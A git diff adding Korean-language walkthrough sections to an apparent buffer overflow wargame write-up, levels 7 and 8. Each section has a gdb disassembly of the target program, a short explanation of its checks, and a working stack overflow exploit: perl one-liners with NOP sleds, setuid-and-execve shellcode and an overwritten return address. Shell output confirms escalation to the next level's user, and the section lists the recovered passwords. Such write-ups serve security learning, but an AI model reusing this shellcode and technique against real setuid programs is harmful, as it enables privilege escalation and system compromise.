@@ -595,7 +595,204 @@ $
 알아낸 lv7 비번 : do you know argv?
 
 ## lv 7
+gdb로 lv8가 무슨 프로그램인지 확인해보자.
+```
+   0x08048500 <+0>:	push   ebp
+   0x08048501 <+1>:	mov    ebp,esp
+   0x08048503 <+3>:	sub    esp,0x2c
+   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x2
+   0x0804850a <+10>:	je     0x8048523 <main+35>
+   0x0804850c <+12>:	push   0x8048690
+   0x08048511 <+17>:	call   0x8048410 <printf@plt>
+   0x08048516 <+22>:	add    esp,0x4
+   0x08048519 <+25>:	push   0x0
+   0x0804851b <+27>:	call   0x8048420 <exit@plt>
+   0x08048520 <+32>:	add    esp,0x4
+   0x08048523 <+35>:	nop
+   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
+   0x0804852b <+43>:	nop
+   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
+   0x0804853a <+58>:	mov    eax,ds:0x80497cc
+   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
+   0x08048543 <+67>:	jne    0x8048547 <main+71>
+   0x08048545 <+69>:	jmp    0x8048587 <main+135>
+   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
+   0x08048551 <+81>:	mov    eax,ds:0x80497cc
+   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048559 <+89>:	push   edx
+   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
+   0x0804855f <+95>:	add    esp,0x4
+   0x08048562 <+98>:	mov    eax,eax
+   0x08048564 <+100>:	push   eax
+   0x08048565 <+101>:	push   0x0
+   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
+   0x08048571 <+113>:	mov    eax,ds:0x80497cc
+   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048579 <+121>:	push   edx
+   0x0804857a <+122>:	call   0x8048430 <memset@plt>
+   0x0804857f <+127>:	add    esp,0xc
+   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
+   0x08048585 <+133>:	jmp    0x8048530 <main+48>
+   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804858a <+138>:	add    eax,0x4
+   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
+   0x0804858f <+143>:	add    edx,0x2f
+   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
+   0x08048595 <+149>:	je     0x80485b0 <main+176>
+   0x08048597 <+151>:	push   0x80486a3
+   0x0804859c <+156>:	call   0x8048410 <printf@plt>
+   0x080485a1 <+161>:	add    esp,0x4
+   0x080485a4 <+164>:	push   0x0
+   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
+   0x080485ab <+171>:	add    esp,0x4
+   0x080485ae <+174>:	mov    esi,esi
+   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	push   edx
+   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
+   0x080485be <+190>:	add    esp,0x4
+   0x080485c1 <+193>:	mov    eax,eax
+   0x080485c3 <+195>:	cmp    eax,0x30
+   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
+   0x080485c8 <+200>:	push   0x80486c0
+   0x080485cd <+205>:	call   0x8048410 <printf@plt>
+   0x080485d2 <+210>:	add    esp,0x4
+   0x080485d5 <+213>:	push   0x0
+   0x080485d7 <+215>:	call   0x8048420 <exit@plt>
+   0x080485dc <+220>:	add    esp,0x4
+   0x080485df <+223>:	nop
+   0x080485e0 <+224>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485e3 <+227>:	add    eax,0x4
+   0x080485e6 <+230>:	mov    edx,DWORD PTR [eax]
+   0x080485e8 <+232>:	push   edx
+   0x080485e9 <+233>:	lea    eax,[ebp-0x28]
+   0x080485ec <+236>:	push   eax
+   0x080485ed <+237>:	call   0x8048440 <strcpy@plt>
+   0x080485f2 <+242>:	add    esp,0x8
+   0x080485f5 <+245>:	lea    eax,[ebp-0x28]
+   0x080485f8 <+248>:	push   eax
+   0x080485f9 <+249>:	push   0x80486d7
+   0x080485fe <+254>:	call   0x8048410 <printf@plt>
+   0x08048603 <+259>:	add    esp,0x8
+   0x08048606 <+262>:	push   0x28
+   0x08048608 <+264>:	push   0x0
+   0x0804860a <+266>:	lea    eax,[ebp-0x28]
+   0x0804860d <+269>:	push   eax
+   0x0804860e <+270>:	call   0x8048430 <memset@plt>
+   0x08048613 <+275>:	add    esp,0xc
+   0x08048616 <+278>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048619 <+281>:	add    eax,0x4
+   0x0804861c <+284>:	mov    edx,DWORD PTR [eax]
+   0x0804861e <+286>:	push   edx
+   0x0804861f <+287>:	call   0x80483f0 <strlen@plt>
+   0x08048624 <+292>:	add    esp,0x4
+   0x08048627 <+295>:	mov    eax,eax
+   0x08048629 <+297>:	push   eax
+   0x0804862a <+298>:	push   0x0
+   0x0804862c <+300>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804862f <+303>:	add    eax,0x4
+   0x08048632 <+306>:	mov    edx,DWORD PTR [eax]
+   0x08048634 <+308>:	push   edx
+   0x08048635 <+309>:	call   0x8048430 <memset@plt>
+   0x0804863a <+314>:	add    esp,0xc
+   0x0804863d <+317>:	leave  
+   0x0804863e <+318>:	ret 
+ ```
+argc가 2개로 제한되어있으므로 파일명을 포함하여 인자는 1개를 초과할 수 없다.
+
+또한 버퍼를 지우는 것은 물론 함수 인자부분부터 환경변수까지 모두 0으로 초기화 시킨다.
+
+해결책으로 lv6을 해결할때 이용한 심볼릭 링크를 이용하면 된다.  
+즉, 실행프로그램 이름에 적당한 개수의 nop와 쉘코드를 넣고   
+ret부분에 들어갈 주소를 argv[0]을 가리키는 주소로 바꿔주면 해결된다.
+
+```
+lv7@ubuntu:~$ ./`perl -e 'print "\x90"x100, "\x66\xb8\xf0\x03\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'` `perl -e 'print "a"x44, "\xcc\xd2\xff\xff"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+$ whoami
+lv8
+$ id
+uid=1008(lv8) gid=1007(lv7) groups=1007(lv7)
+```
+알아낸 lv8 비번 : bothering argc
+
 ## lv 8
+gdb로 lv9가 무슨 프로그램인지 확인해보자.
+```
+   0x08048430 <+0>:	push   ebp
+   0x08048431 <+1>:	mov    ebp,esp
+   0x08048433 <+3>:	sub    esp,0x28
+   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804843a <+10>:	jg     0x8048453 <main+35>
+   0x0804843c <+12>:	push   0x8048520
+   0x08048441 <+17>:	call   0x8048350 <printf@plt>
+   0x08048446 <+22>:	add    esp,0x4
+   0x08048449 <+25>:	push   0x0
+   0x0804844b <+27>:	call   0x8048360 <exit@plt>
+   0x08048450 <+32>:	add    esp,0x4
+   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048456 <+38>:	add    eax,0x4
+   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]
+   0x0804845b <+43>:	add    edx,0x2f
+   0x0804845e <+46>:	cmp    BYTE PTR [edx],0xff
+   0x08048461 <+49>:	je     0x8048480 <main+80>
+   0x08048463 <+51>:	push   0x804852c
+   0x08048468 <+56>:	call   0x8048350 <printf@plt>
+   0x0804846d <+61>:	add    esp,0x4
+   0x08048470 <+64>:	push   0x0
+   0x08048472 <+66>:	call   0x8048360 <exit@plt>
+   0x08048477 <+71>:	add    esp,0x4
+   0x0804847a <+74>:	lea    esi,[esi+0x0]
+   0x08048480 <+80>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048483 <+83>:	add    eax,0x4
+   0x08048486 <+86>:	mov    edx,DWORD PTR [eax]
+   0x08048488 <+88>:	add    edx,0x2e
+   0x0804848b <+91>:	cmp    BYTE PTR [edx],0xff
+   0x0804848e <+94>:	jne    0x80484a7 <main+119>
+   0x08048490 <+96>:	push   0x8048549
+   0x08048495 <+101>:	call   0x8048350 <printf@plt>
+   0x0804849a <+106>:	add    esp,0x4
+   0x0804849d <+109>:	push   0x0
+   0x0804849f <+111>:	call   0x8048360 <exit@plt>
+   0x080484a4 <+116>:	add    esp,0x4
+   0x080484a7 <+119>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484aa <+122>:	add    eax,0x4
+   0x080484ad <+125>:	mov    edx,DWORD PTR [eax]
+   0x080484af <+127>:	push   edx
+   0x080484b0 <+128>:	lea    eax,[ebp-0x28]
+   0x080484b3 <+131>:	push   eax
+   0x080484b4 <+132>:	call   0x8048370 <strcpy@plt>
+   0x080484b9 <+137>:	add    esp,0x8
+   0x080484bc <+140>:	lea    eax,[ebp-0x28]
+   0x080484bf <+143>:	push   eax
+   0x080484c0 <+144>:	push   0x804855f
+   0x080484c5 <+149>:	call   0x8048350 <printf@plt>
+   0x080484ca <+154>:	add    esp,0x8
+   0x080484cd <+157>:	leave  
+   0x080484ce <+158>:	ret
+```
+이번 프로그램은 값을 초기화하는 부분이 전혀 없다.  
+그리고 이번에 새롭게 추가된 조건은 입력된 값의 47번째가 \xff면 안된다는 점이다.
+
+그러나 argc 제한이나 입력글자 수 제한 같은건 하나도 없다.   
+단지 47번째에 \xff를 피해주면 되는것이므로 nop값을 100000개 정도 넣어주자.  
+이렇게 해주면 \xff가 아닌 주소값들에도 nop이 들어차게 될 것이고 ret에 넣어줄 주소값에 \xff를 피할 수 있게된다.
+```
+./lv9 `perl -e 'print "a"x44, "\xff\xff\xfe\xff", "\x90"x100000,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+```
+```
+$ whoami
+lv9
+$ my-pass
+troll slayer
+$ 
+```
+알아낸 lv9 비번 : troll slayer
 ## lv 9
 ## lv 10
 ## lv 11
